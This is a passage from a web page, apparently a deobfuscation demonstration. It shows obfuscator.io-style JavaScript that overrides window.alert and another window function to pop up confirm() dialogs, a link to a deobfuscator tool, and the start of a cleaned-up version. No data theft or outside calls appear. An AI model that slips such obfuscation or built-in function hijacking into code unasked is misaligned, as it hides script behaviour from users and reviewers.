punctuation">,</span>_0x5ed1e0<span class="token operator">=</span><span class="token number">0x162d</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x1d</span><span class="token operator">*</span><span class="token number">0xda</span><span class="token operator">+</span><span class="token number">0x3</span><span class="token operator">*</span><span class="token number">0xd7</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span><span class="token punctuation">(</span>_0x161f25<span class="token punctuation">[</span>_0x5ed1e0<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span><span class="token string">'0'</span><span class="token operator">:</span>_0x2e72f3<span class="token punctuation">[</span><span class="token function">_0x2b8afa</span><span class="token punctuation">(</span>_0x86515e<span class="token punctuation">.</span>_0x14f997<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x5d2011<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x1fabb8<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x18ef54<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>_0x335615<span class="token punctuation">[</span><span class="token function">_0x2b8afa</span><span class="token punctuation">(</span><span class="token number">0x455</span><span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x3642df<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x5e5450<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x15d374<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x335615<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">case</span><span class="token string">'1'</span><span class="token operator">:</span><span class="token keyword">var</span> _0x5b572d<span class="token operator">=</span>_0xf883ee<span class="token punctuation">[</span>_0x2327c2<span class="token punctuation">]</span><span class="token operator">||</span>_0x2e72f3<span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">case</span><span class="token string">'2'</span><span class="token operator">:</span><span class="token keyword">var</span> _0x2327c2<span class="token operator">=</span>_0x53109c<span class="token punctuation">[</span>_0x52328e<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">case</span><span class="token string">'3'</span><span class="token operator">:</span>_0x2e72f3<span class="token punctuation">[</span><span class="token string">'toString'</span><span class="token punctuation">]</span><span class="token operator">=</span>_0x5b572d<span class="token punctuation">[</span><span class="token function">_0x2b8afa</span><span class="token punctuation">(</span>_0x86515e<span class="token punctuation">.</span>_0xbb9bff<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x540c80<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x28a91f<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x174890<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">_0xfcd4c3</span><span class="token punctuation">(</span>_0x86515e<span class="token punctuation">.</span>_0x17342b<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x13795f<span class="token punctuation">,</span><span class="token number">0x190</span><span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x3c7980<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x5b572d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">case</span><span class="token string">'4'</span><span class="token operator">:</span>_0xf883ee<span class="token punctuation">[</span>_0x2327c2<span class="token punctuation">]</span><span class="token operator">=</span>_0x2e72f3<span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">case</span><span class="token string">'5'</span><span class="token operator">:</span><span class="token keyword">var</span> _0x2e72f3<span class="token operator">=</span>_0x335615<span class="token punctuation">[</span><span class="token function">_0x2b8afa</span><span class="token punctuation">(</span>_0x86515e<span class="token punctuation">.</span>_0x397a84<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x28a91f<span class="token punctuation">,</span><span class="token number">0x43c</span><span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x1dacac<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">_0xfcd4c3</span><span class="token punctuation">(</span><span class="token number">0x1ad</span><span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x128216<span class="token punctuation">,</span><span class="token number">0x194</span><span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x500c6c<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">_0xfcd4c3</span><span class="token punctuation">(</span><span class="token number">0x18f</span><span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x2d2155<span class="token punctuation">,</span>_0x86515e<span class="token punctuation">.</span>_0x26599c<span class="token punctuation">,</span><span class="token number">0x19f</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x335615<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_0xfb81ef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">[</span><span class="token function">_0x43b95d</span><span class="token punctuation">(</span><span class="token number">0x195</span><span class="token punctuation">,</span><span class="token number">0x186</span><span class="token punctuation">,</span><span class="token number">0x177</span><span class="token punctuation">,</span><span class="token number">0x185</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x11e4ba<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x54ce81</span><span class="token operator">:</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3f05fd</span><span class="token operator">:</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3c12d8</span><span class="token operator">:</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4f7709</span><span class="token operator">:</span><span class="token number">0x24b</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4097be</span><span class="token operator">:</span><span class="token number">0x261</span><span class="token punctuation">,</span><span class="token literal-property property">_0x26b0f8</span><span class="token operator">:</span><span class="token number">0x24e</span><span class="token punctuation">,</span><span class="token literal-property property">_0x34a3a3</span><span class="token operator">:</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token literal-property property">_0x67fb88</span><span class="token operator">:</span><span class="token number">0x9c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4337fa</span><span class="token operator">:</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2d8f19</span><span class="token operator">:</span><span class="token number">0xbe</span><span class="token punctuation">,</span><span class="token literal-property property">_0x16ffa7</span><span class="token operator">:</span><span class="token number">0x25c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x29c7a0</span><span class="token operator">:</span><span class="token number">0x239</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4fd058</span><span class="token operator">:</span><span class="token number">0x245</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1eed2e</span><span class="token operator">:</span><span class="token number">0x251</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3d8cce</span><span class="token operator">:</span><span class="token number">0x25c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x135008</span><span class="token operator">:</span><span class="token number">0x27e</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1548b1</span><span class="token operator">:</span><span class="token number">0x264</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1aa760</span><span class="token operator">:</span><span class="token number">0x23c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x229bf7</span><span class="token operator">:</span><span class="token number">0x244</span><span class="token punctuation">,</span><span class="token literal-property property">_0xe6db95</span><span class="token operator">:</span><span class="token number">0x239</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3aa31e</span><span class="token operator">:</span><span class="token number">0x23b</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3c19c3</span><span class="token operator">:</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token literal-property property">_0x52b346</span><span class="token operator">:</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token literal-property property">_0x48ed1f</span><span class="token operator">:</span><span class="token number">0x268</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5d4762</span><span class="token operator">:</span><span class="token number">0x26c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3c9e76</span><span class="token operator">:</span><span class="token number">0x254</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2a9f09</span><span class="token operator">:</span><span class="token number">0x276</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x28ad78<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x5cc3bd</span><span class="token operator">:</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token literal-property property">_0x17ef46</span><span class="token operator">:</span><span class="token number">0x1a2</span><span class="token punctuation">,</span><span class="token literal-property property">_0x53dab6</span><span class="token operator">:</span><span class="token number">0x129</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x36a7b3<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x2f2c5a</span><span class="token operator">:</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token literal-property property">_0x101124</span><span class="token operator">:</span><span class="token number">0x10b</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x8bd32d<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string-property property">'BmCfZ'</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x571dda<span class="token punctuation">,</span>_0x15b43b</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x571dda</span><span class="token punctuation">(</span>_0x15b43b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string-property property">'rjCiw'</span><span class="token operator">:</span><span class="token string">'rqxvweqty，'</span><span class="token operator">+</span><span class="token function">_0x2f5b69</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x54ce81<span class="token punctuation">,</span><span class="token number">0x86</span><span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x3f05fd<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x3c12d8<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'of\x20it'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x12c806<span class="token operator">=</span><span class="token function">_0xf4e5c</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x4f7709<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x4097be<span class="token punctuation">,</span><span class="token number">0x258</span><span class="token punctuation">,</span><span class="token number">0x25a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">_0xf4e5c</span><span class="token punctuation">(</span><span class="token number">0x261</span><span class="token punctuation">,</span><span class="token number">0x252</span><span class="token punctuation">,</span><span class="token number">0x282</span><span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x26b0f8<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'e'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0xf4e5c</span><span class="token punctuation">(</span><span class="token parameter">_0x5cdb5f<span class="token punctuation">,</span>_0x1bf623<span class="token punctuation">,</span>_0x4be90e<span class="token punctuation">,</span>_0x2b1dd6</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x43b95d</span><span class="token punctuation">(</span>_0x5cdb5f<span class="token operator">-</span>_0x36a7b3<span class="token punctuation">.</span>_0x2f2c5a<span class="token punctuation">,</span>_0x1bf623<span class="token punctuation">,</span>_0x4be90e<span class="token operator">-</span>_0x36a7b3<span class="token punctuation">.</span>_0x101124<span class="token punctuation">,</span>_0x2b1dd6<span class="token operator">-</span>_0x36a7b3<span class="token punctuation">.</span>_0x2f2c5a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>_0x8bd32d<span class="token punctuation">[</span><span class="token function">_0x2f5b69</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x34a3a3<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x67fb88<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x4337fa<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x2d8f19<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>confirm<span class="token punctuation">,</span>_0x12c806<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x2f5b69</span><span class="token punctuation">(</span><span class="token parameter">_0xfde3ce<span class="token punctuation">,</span>_0x57f13f<span class="token punctuation">,</span>_0x4cdb67<span class="token punctuation">,</span>_0x13e691</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x43b95d</span><span class="token punctuation">(</span>_0x57f13f<span class="token operator">-</span> <span class="token operator">-</span>_0x28ad78<span class="token punctuation">.</span>_0x5cc3bd<span class="token punctuation">,</span>_0x13e691<span class="token punctuation">,</span>_0x4cdb67<span class="token operator">-</span>_0x28ad78<span class="token punctuation">.</span>_0x17ef46<span class="token punctuation">,</span>_0x13e691<span class="token operator">-</span>_0x28ad78<span class="token punctuation">.</span>_0x53dab6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>_0x8bd32d<span class="token punctuation">[</span><span class="token function">_0xf4e5c</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x16ffa7<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x29c7a0<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x4fd058<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x1eed2e<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>confirm<span class="token punctuation">,</span>_0x8bd32d<span class="token punctuation">[</span><span class="token string">'rjCiw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x8bd32d<span class="token punctuation">[</span><span class="token function">_0xf4e5c</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x3d8cce<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x135008<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x1548b1<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x1aa760<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>confirm<span class="token punctuation">,</span><span class="token function">_0xf4e5c</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x229bf7<span class="token punctuation">,</span><span class="token number">0x23d</span><span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0xe6db95<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x3aa31e<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">_0x2f5b69</span><span class="token punctuation">(</span><span class="token number">0xcd</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x3c19c3<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x52b346<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">_0xf4e5c</span><span class="token punctuation">(</span>_0x11e4ba<span class="token punctuation">.</span>_0x48ed1f<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x5d4762<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x3c9e76<span class="token punctuation">,</span>_0x11e4ba<span class="token punctuation">.</span>_0x2a9f09<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">confirm</span><span class="token punctuation">(</span>xxxxxxx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x5bfa63<span class="token punctuation">,</span> _0x281ba4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _0x19cd46 <span class="token operator">=</span> <span class="token function">_0x5bfa63</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> _0x27e61b <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">208</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x17a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">226</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x132</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">253</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x124</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x185</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">251</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x16a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">6</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">264</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x17c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">267</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x146</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">268</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0xde</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x115</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x166</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0x174</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">12</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x27e61b <span class="token operator">===</span> _0x281ba4<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        _0x19cd46<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>_0x19cd46<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>_0x412f22<span class="token punctuation">)</span> <span class="token punctuation">{</span>      _0x19cd46<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>_0x19cd46<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_0x219d<span class="token punctuation">,</span> <span class="token number">299550</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token function-variable function">_0x3587de</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _0x1e85cf <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token function-variable function">uxsEH</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x124e68<span class="token punctuation">,</span> _0x375486</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> _0x124e68 <span class="token operator">!==</span> _0x375486<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  _0x1e85cf<span class="token punctuation">.</span>bhVnY <span class="token operator">=</span> <span class="token string">"EaazM"</span><span class="token punctuation">;</span>  _0x1e85cf<span class="token punctuation">.</span><span class="token function-variable function">OZlVU</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0xf0c5e5<span class="token punctuation">,</span> _0x41f4ee</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> _0xf0c5e5 <span class="token operator">===</span> _0x41f4ee<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  _0x1e85cf<span class="token punctuation">.</span>FroGP <span class="token operator">=</span> <span class="token string">"QcwjX"</span><span class="token punctuation">;</span>  _0x1e85cf<span class="token punctuation">.</span>mGUiQ <span class="token operator">=</span> <span class="token string">"BvpaY"</span><span class="token punctuation">;</span>  _0x1e85cf<span class="token punctuation">.</span><span class="token function-variable function">OhlTn</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x558755<span class="token punctuation">,</span> _0x4bc882</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> _0x558755 <span class="token operator">===</span> _0x4bc882<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  _0x1e85cf<span class="token punctuation">.</span>fcdOE <span class="token operator">=</span> <span class="token string">"Hfdtq"</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> _0x14c4a4 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x1c40d7<span class="token punctuation">,</span> _0x5cfc78</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x1e85cf<span class="token punctuation">.</span><span class="token function">OhlTn</span><span class="token punctuation">(</span>_0x1e85cf<span class="token punctuation">.</span>fcdOE<span class="token punctuation">,</span> _0x1e85cf<span class="token punctuation">.</span>fcdOE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> _0x3a58cc <span class="token operator">=</span> _0x14c4a4 <span class="token operator">?</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"EaazM"</span> <span class="token operator">!==</span> _0x1e85cf<span class="token punctuation">.</span>bhVnY<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x2919f7<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> _0x493883 <span class="token operator">=</span> <span class="token function">_0xc6e29b</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_0x4d40d9<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>            _0x35dcd6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> _0x493883<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x5cfc78<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x1e85cf<span class="token punctuation">.</span><span class="token function">OZlVU</span><span class="token punctuation">(</span>_0x1e85cf<span class="token punctuation">.</span>FroGP<span class="token punctuation">,</span> _0x1e85cf<span class="token punctuation">.</span>mGUiQ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">var</span> _0xfc9fa9 <span class="token operator">=</span> <span class="token class-name">_0x55e4f3</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">prototype</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>_0x22afd3<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">var</span> _0x105f60 <span class="token operator">=</span> _0x17d803<span class="token punctuation">[</span>_0x3e5e3b<span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token keyword">var</span> _0x1b7aa8 <span class="token operator">=</span> _0x59608f<span class="token punctuation">[</span>_0x105f60<span class="token punctuation">]</span> <span class="token operator">||</span> _0xfc9fa9<span class="token punctuation">;</span>              _0xfc9fa9<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token function">_0x20b288</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>_0xd5c9ab<span class="token punctuation">)</span><span class="token punctuation">;</span>              _0xfc9fa9<span class="token punctuation">.</span>toString <span class="token operator">=</span> _0x1b7aa8<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>_0x1b7aa8<span class="token punctuation">)</span><span class="token punctuation">;</span>              _0x38656c<span class="token punctuation">[</span>_0x105f60<span class="token punctuation">]</span> <span class="token operator">=</span> _0xfc9fa9<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>              <span class="token keyword">var</span> _0x32d595 <span class="token operator">=</span> <span class="token function">_0x5cfc78</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_0x1c40d7<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>              _0x5cfc78 <span 